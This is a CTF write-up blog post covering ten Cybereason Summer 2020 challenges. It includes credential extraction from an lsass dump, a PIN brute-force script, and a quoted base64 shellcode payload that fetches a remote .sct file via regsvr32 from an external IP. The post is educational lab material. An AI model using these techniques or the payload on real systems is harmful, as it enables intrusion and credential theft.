---
layout: single
title: "Cybereason CTF Writeup (ALL CHALLENGES)"
excerpt: "Walkthrough for Cybereason Summer 2020 CTF"
date: 2020-08-24
classes : wide
header:
  teaser: /assets/images/cybereason/ctf.png
  teaser_home_page: true
categories:
  - ctf
tags:
  - web-app
  - stego
  - reverse-engineering
  - dfir
---

Hello infosec folks. I hope the weekend has found you all good. I recently participated in Cybereason Summer 2020 ctf as ``pi0x73`` with team : ``unallocated`` finishing all 10 out of 10 challenges. I made a walkthrough of them in this blog post since I found some of them very interesting and worth sharing for someone else to read.

## Overwiew

## Challenges
```
├── 00 Basic
│   ├── Been There (5)
│   ├── Executive retreat to Amity Island (5)
|   └── Malop (5)
├── 01 Intermediate
│   ├── A thin pane of glass (10)
│   ├── I'm not even supposed to be here today (10)
│   ├── Its a shame really  (10)
|   └── Swiftly (10)
└── 02 Advanced
    ├── Are you still investigating that? (15)
    ├── Images != password vaults (15)
    └── REally this should be easier (15)
```


## 00 Basic



## 1.Been There (5)

**Description** :
> *Carl, the guy a few desks down that is always talking about owls, forgot his password again and we can't reset it. But, we managed to get a lsass dump from the machine. Our password policy only requires two numbers and some letters.*
**Files** :
``lsass.dmp``

From the description and the file provided , it seems like a basic challenge. Simply downloading the dump and extracting a hash which should be decrypted afterwards.
I quickly downloaded the file and loaded it using **pypykatz**

```
┌──(root㉿kali)-[~/Downloads]
└─# ls -la lsass.DMP
-rw-r--r-- 1 root root 0 Aug 23 13:56 lsass.DMP
                                                                                                                                                               
┌──(root㉿kali)-[~/Downloads]
└─# pypykatz lsa minidump lsass.DMP
INFO:root:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 1327349 (1440f5)
session_id 2
username Ben Hacked
domainname DESKTOP-QF68C1O
logon_server WIN-923HNK120UR
logon_time 2020-07-23T20:05:52.518371+00:00
sid S-1-5-21-1044796357-2890486572-795209491-1001
luid 1327349
        == MSV ==
                Username: Ben Hacked
                Domain: DESKTOP-QF68C1O
                LM: NA
                NT: 1b07bf7e4ae05f62c852daa3a8d92d25
                SHA1: 68dcb2168fe348fde9ee7beb3471658991ed812f
        == WDIGEST [1440f5]==
                username Ben Hacked
                domainname DESKTOP-QF68C1O
                password None
        == Kerberos ==
                Username: Ben Hacked
                Domain: DESKTOP-QF68C1O
                Password: None
        == WDIGEST [1440f5]==
                username Ben Hacked
                domainname DESKTOP-QF68C1O
                password None
        == DPAPI [1440f5]==
                luid 1327349
                key_guid f2af18ab-d372-4112-8fd9-dccfc34a02c
                masterkey 7a3ab1431df02bd185db2f2120716c439f4a76abd2ac4c55d00045ab83c74bde34f1379a756f20b5190cf8487fa681b674622164149a6009982923308618dfc8
                sha1_masterkey bf5a5d35844dd6ac7a925ba62d548ec34121dd44
```

I can simply notice the NT hash : `1b07bf7e4ae05f62c852daa3a8d92d25`
However while trying to crack on john or hashcat I didnt came up with anything so I decided to use https://hashes.com to crack it and came up with the following result:
![hash](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/hash.png)

**Flag** : `archimedes01`



## 2. Executive retreat to Amity Island (5)

**Description** :
>*Here is a list of the executives here at Cybereason. Somthing tells me that it's not complete.*
**Webpage** : 
>*http://challenges.ctfd.io:30135*

I simply navigated the webpage which came up with a list of workers for the Cybereason company :

![web](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/web.png)

There seems to be a simple page viewing workers by taking a value on `?id` parameter.
While navigating I noticed that the workers listing starts from `?id=2`.

I thought the flag could be hidding on `?id=1` so I gave it a try using curl :
```
┌──(root㉿kali)-[~]
└─# curl -XGET challenges.ctfd.io:30135/?id=1 | grep flag
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4551  100  4551    0     0  1039        <p class="card-text"><small class="text-muted">flag{5h4rk_bait_hoohaha}</small></p>
0      0 --:--:-- --:--:-- --:--:-- 10366
```

#### Flag : `flag{5h4rk_bait_hoohaha}`


## 3. Malop (5)

#### Description :
``What is the hash of the Excel file discovered by Cybereason attempting to use a Domain Generating Algorithm on richard-win10?``
#### URL :
https://summerctf.cybereason.net/#/discovery/inbox
#### Credentials :
``User: summerctf@cybereason.com``
``Password: summerctf2020``

The website seems like a malware & threat analyzing platform. I simply use the credentials provided and start looking for the machine mentioned in the description to grab more information.

Quickly noticed one threat marked as low which seems to hold exactly what I'm looking for:
![excel](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/excel.png)

Under 5 machines that seem to have been affected from this threat I can notice the machine we are looking for : `richard-win10`

![machines](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/machine.png)

I click on Investigate under the mentioned machine and viewed a tree of the latest processes where can be noticed excel.exe marked in red :

![tree](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/tree.png)

7 excel files are found to be opened under the process and I decided to view one of them which kinda looked weird by it's name : `2020 recruitment plan.xlsm:zone.identifier:$data`

![md5](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/md5.png)

I tried to use the MD5 file hash as a flag and this happened to work as a correct flag.

#### Flag : ``fbccf14d504b7b2dbcb5a5bda75bd93b``



## 01 Intermediate


## 1. A thin pane of glass (10)

#### Description :
``A windows machine was compromised. We think it was related to credential reuse. But not sure whose account. Any ways, my eyes hurt scrolling through this log.``
#### Files :
``SecLog.csv``

Yet another kinda basic one, We are provided with a large `.csv` and are supposed to find the account which caused the trouble.
I download the file and view it using `cat` but since the challenge only mentions that it needs to find the user account I am going to grep for them using ``"Account Name"`` as my grepping string :

```
┌──(root㉿kali)-[~/Downloads]
└─# cat SecLog.csv | grep "Account Name"
[...]
Account Name : robberte
Account Name : jrock
Account Name : bubbles
Account Name : MrLehey
```
All four of them might be a possible correct flag so I tried all four of them...

#### Flag : ``MrLehey``



## 2. Its a shame really  (10)

#### Description :
``We had to let one our sysadmins go. They may have been leaking data. We suspect this server, challenges.ctfd.io:30129, was used but can't seem to get in. Can you help us get in?``

I first connected to the remote server using `netcat` to somehow find out whats the deal with the challenge : 
![nc](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/nc.png)

The remote server asks for a 4-digit pin as seen in the above screenshot and probably compares it with it's correct pin. I smell bruteforcing , do you smell that too..?

Seems like automating the whole thing in a small python script would be cool and helpful.

```python
import socket
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('challenges.ctfd.io', 30129))

for i in open('pin.txt', 'r'):

        print s.recv(1024)
        s.send(i)
        print(i)
```

The script above makes a connection with the remote server and tries to input the strings found in pin.txt.
To make that fully complete I am going to also generate a wordlist of all possible 4-digit numeric pins using crunch :

```
┌──(root㉿kali)-[~/Downloads]
└─# crunch 4 4 0123456789 -o pin.txt    
Crunch will now generate the following amount of data: 50000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 10000 

crunch: 100% completed generating output
```

And execute the script by grepping to flag string , so I can catch the flag when the correct pin is inputed :

```
┌──(root㉿kali)-[~/Downloads]
└─# python exploit.py | grep flag 
flag{usedthebruteforce}
```

#### FLAG : ``usedthebruteforce``


## 3. Swiftly (10)
#### Description : 
``I forgot what Swift says using mirrored raid makes you. Here is some log to help figure it out.``
#### Files :
``HAR.HAR``

Before even starting to navigate onto the challenge I had too google what `.HAR` files are and how are they usually treated:

HAR, short for HTTP Archive, is a format used for tracking information between a web browser and a website. A HAR file is primarily used for identifying performance issues, such as bottlenecks and slow load times, and page rendering problems.

And googling how to open : 
![har](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/har.png)

Wonderful! Google has an online tool for that , so Im going to load the challenge file on it and look for what I need.

Upon loading the file and analyzing it content , I tried to stick by description and filter results for SWIFT since that is what I'm looking for :
![swift](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/SWIFT.png)


This twitter post url came up : https://twitter.com/SwiftOnSecurity/status/1283833344220893186

![tweet](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/tweet.png)

That one seems kinda guessy but I mean , I do have a description which says I need to figure out what does using RAID makes u , so by looking the picture maybe it makes me look like clown...??? 
Correct! A clown!

#### FLAG : ``CLOWN``


## 4. I'm not even supposed to be here today (10)
#### Description :
``Kelesy complained about something strange on her computer, and the L1 analyst looking at it could use some help. Can you provide the remote file name that was downloaded and executed to establish Command and Control. Kelesy's machine name is Kelsey-prodmgr .``

I am provided with the same website and credentials as the previous challenge (Malop) , but with a different kind of task.

Aight... Let's go get this one too.

Once Im in the website , I decided to check on `High` marked threats :

![high](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/kelsey.png)

Right there is what I need, a missuse of powershell.exe on kelsey-prodmgr.
I clicked on that to have a deeper view on the threat and came up with this : 

![cmd](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/nav.png)

I clicked to expand them and quickly noticed an encoded powershell command at the fourth :
``/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu+AdKgpoppW9nf/VPAZ8CoD74HUFu0cTcm9qAFP/1XJlZ3N2cjMyIC9zIC9uIC91IC9pOmh0dHA6Ly82Ni4xNzUuMTAwLjQ1L3BheWxvYWQta2Vsc2V5LnNjdCBzY3JvYmouZGxsAA==
``

![b64](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/b64.png)

I can see a file being dropped in the machine but sadly none of those filenames above were the correct flag so I decided to again open the tree of the following powershell process and see whats there :

![tree2](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/tree2.png)

Something interesting going on with bitsadmin.exe which tries to transfer 2 files : ``updates.xml`` and ``msbuild_nps.xml`` from http://rctesting.duckdns.org which seems suspicious...

I tried to use both of the files as flags since ... why not? and ended up with one of them being correct.

#### FLAG : ``msbuild_nps.xml``

## 02 Advanced 


## 1. Images != password vaults (15)
#### Description : 
``Rember that sysadmin we had to let go? We found an image that we think has their admin password but it appears to be corrupted.``
#### File : 
``password1.png``

I tried to view the image in my machine but as it's said in description it is corrupted so going to use pngcheck to see for possible errors :
```
┌──(root㉿kali)-[~/Downloads]
└─# pngcheck password1.png                                                                                                                                 2 ⨯
password1.png  CRC error in chunk IHDR (computed ae28072d, expected 3d8d3c4d)
ERROR: password1.png
```
A CRC error is dropped on the chunk IHDR 

I can use PCRT to fix that error which is an Automated PNG Check & Repair Tool : 

```
┌──(root㉿kali)-[~/tools/PCRT]
└─# python PCRT.py -i /root/Downloads/password1.png -v -y -o password1.png

         ____   ____ ____ _____ 
        |  _ \ / ___|  _ \_   _|
        | |_) | |   | |_) || |  
        |  __/| |___|  _ < | |  
        |_|    \____|_| \_\|_|  

        PNG Check & Repair Tool 

Project address: https://github.com/sherlly/PCRT
Author: sherlly
Version: 1.1

[Finished] Correct PNG header
[Detected] Error IHDR CRC found! (offset: 0x1D)
chunk crc: 3D8D3C4D
correct crc: AE28072D
[Finished] Successfully fix crc
```

The recovered image is loaded but doesnt yet seem fully recovered.
![png](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/png.png)

Nothing was found either on `binwalk` or `exiftool`. However while enumerating the image something seemed somehow weird to me... the image resolution : 1000x500.
I didnt have any exact explaination or reference for what I did but I just thought of scaling the image to 1000x1000 using [TweakPNG](http://entropymine.com/jason/tweakpng/). Maybe there is a hidden part that I can recover while changing resolution.

After changing to 1000x1000 I get this:

![flag](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/flag.png)

#### FLAG : ``g@rb@g3_fil3_fr0m_7th3_gib$0n``
NOTE : A more detailed and explained writeup from my teammatecan be found here : https://medium.com/@bl00dy.al/images-password-vaults-cybereasons-summer-ctf-c83be3e9e08


## 2. REally this should be easier (15)
#### Description : 
``A random binary appears. Does this even have a purpose? Maybe you can get something from it.``
#### Files : 
``Win.exe``, ``Mac``

The description doesnt seem to hint about anything specifically and this was by far the hardest challenge on the whole collection . 
I downloaded the file and started to do some analysing on it :

```
┌──(root㉿kali)-[~/Downloads]
└─# file Win.exe                                                                                                                                         130 ⨯
Win.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows
```
Lets execute the binary using Wine :
![wine](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/wine.png)

Nothing unexpected here and a large amount of strings which doesnt hold anything usual, but you can notice it's written in GO so that will be hard to reverse.
I dropped the file to my Reversing VM and started to dig into it using ``x64dbg`` .

![dbg](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/dbg.png)

Messy right? Trying to reverse that GO file I got a headache and somehow gave up on it. I was only able to find out that the user input is compared by 0x18 length (24)
But wasn't able to find the actual string it compares our input with.
After a while someone mentioned that if you lucky enough there is some base64 around.
I wanted to give it another go but this time look for b64 strings in the file using ``strings`` .
We know that base64 strings usually end with `=` or ``=``  so I tried something like :

```
┌──(root㉿kali)-[~/Downloads]
└─# strings Win.exe | grep ==
[...]
SWYgeW91IGNyYWNrZWQgdGhpcw==
```
```
┌──(root㉿kali)-[~/Downloads]
└─# strings Win.exe | grep =
[...]
eW91IGFyZSBhIGdvb2QgcmV2ZXJzZXI=
```

Decoding those strings : 
```
┌──(root㉿kali)-[~/Downloads]
└─# echo "SWYgeW91IGNyYWNrZWQgdGhpcw==" | base64 -d && echo "eW91IGFyZSBhIGdvb2QgcmV2ZXJzZXI=" | base64 -d                                                 1 ⨯
If you cracked this you are a good reverser                                                                                                                     
```
I tried to input `ifyoucrackedthisyouareagoodreverser` as a password even though it was larger than 24 length and however it failed.
This message seemed like a success message after the input so I thought this could be somehow the flag.
Inputing the sentence as a flag I get this challenge completed!

#### FLAG : ``If you cracked this you are a good reverser``

NOTE : After some more analyzing later I found the missing string
The correct password was : ``Cybereason Summer CTF&01``


## 3. Are you still investigating that? (15)
#### Description :
``What is the GMT timestamp of the first DNS query from the only mobile device to connect to the same Command and Control server as Kelesy's Machine?``

Oh not again...! Provided with the same website of malware and threat analyzing again, I can say that this was the most annoying and boring part of the CTF. Messing with a Malware Hunting platform didnt seem so interesting to me however that was said to have been the goal of all this CTF & Online Conf (Teaching people the Cybereason platform).
Without much side explaination lets go and solve this final challenge.

From the list of the Active Threats we see there is a same phone with 2 active threats. Hopefully it is the phone that we are looking for.

![phone](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/phone.png)

I decided to view the device profile and expand the information. I noticed 5 suspicious outbound connections from a total of 139 connections, and I clicked on the first one.
Now as the description says : ``the only mobile device to connect to the same Command and Control server as Kelesy's Machine``. Luckily we know the previous domain name which was used to transfer malicious files into Kelsey machine : https://rctesting.duckdns.org

Here we meet the same domain name : 
![query](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/query.png)

What we actually need is the time stamped in that part of the information :
![time](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/time.png)

But not yet the correct answer , because the description mentions that the time need to be in raw GMT and here I am provided with GMT 2+ which is my timezone , so Im going to convert the timestamp to GMT :

 June 25, 2020 at 1:07:33 PM GMT+2  >  June 25, 2020 at 11:07:33 AM GMT
 
#### FLAG : ``June 25, 2020 at 11:07:33 AM GMT``
 
## CTF Impressions
This event was overall good and I had a lot of fun while solving the challenges one by one and probably learnt a thing or two from them. My team ended up 14th with maximal score , however we didnt complete everything in time to hope for some prizes. I hope you too learn something new after reading my walkthrough :)
